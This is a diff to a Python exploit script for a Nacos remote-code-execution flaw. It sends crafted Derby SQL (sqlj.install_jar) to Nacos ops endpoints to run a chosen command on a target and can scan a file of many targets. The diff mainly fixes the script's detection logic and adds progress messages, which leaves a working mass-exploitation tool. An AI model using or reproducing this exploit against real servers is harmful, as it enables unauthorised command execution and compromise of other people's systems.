@@ -6,7 +6,6 @@ from urllib.parse import urljoin
 
 from colorama import Fore
 
-
 # proxy = {
 #     'https': 'http://127.0.0.1:8080',
 #     'http': 'http://127.0.0.1:8080'
@@ -17,9 +16,10 @@ header = {
 
 
 # 按装订区域中的绿色按钮以运行脚本。
-def exploit(target, command, service):
+def exploit(target, command, service, args):
     removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
     derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
+    print("正在进行碰撞,请耐心等待!!")
     for i in range(0, sys.maxsize):
         id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
         post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
@@ -34,10 +34,10 @@ def exploit(target, command, service):
         files = {'file': post_sql}
         post_resp = requests.post(url=removal_url, files=files, verify=False, headers=header, timeout=5)
         post_json = post_resp.json()
-        print("正在进行碰撞!!")
-        print(post_json)
-        if post_json['code'] == 404 and post_json['code'] == 403 and "File" not in post_json['message']:
-            print(Fore.YELLOW + f"\n[+] {target} 可能不存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
+        if args.url:
+            print(post_json)
+        if (post_json['code'] == 404 or post_json['code'] == 403) and "File" not in post_json['message']:
+            print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
             break
         if post_json.get('message', None) is None and post_json.get('data', None) is not None:
             print(post_resp.text)
@@ -51,7 +51,7 @@ def exploit(target, command, service):
 if __name__ == '__main__':
     # 设置参数 -u 和 -f
     print(Fore.CYAN + """
-    
+
     _   __                           ____                ____      __           
    / | / /___ __________  _____     / __ \________      / __ \____/ /___ ___  __
   /  |/ / __ `/ ___/ __ \/ ___/    / /_/ / ___/ _ \    / / / / __  / __ `/ / / /
@@ -77,7 +77,7 @@ if __name__ == '__main__':
             target = r'http://' + args.url
         else:
             target = args.url
-        exploit(target=target, command=command, service=service)
+        exploit(target=target, command=command, service=service, args=args)
     if args.file:
         with open(args.file, 'r', encoding="utf-8", errors="ignore") as f:
             for line in f.readlines():
@@ -85,7 +85,10 @@ if __name__ == '__main__':
                 # 如果url没有包括https
                 if not target.startswith('https://') and not target.startswith('http://'):
                     target = r'http://' + target
+                    print(Fore.GREEN + '[+]' + Fore.RESET + ' 正在检测: {}'.format(target))
                     try:
-                        exploit(target=target, command=command, service=service)
+
+                        exploit(target=target, command=command, service=service, args=args)
                     except Exception as e:
+                        print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
                         continue
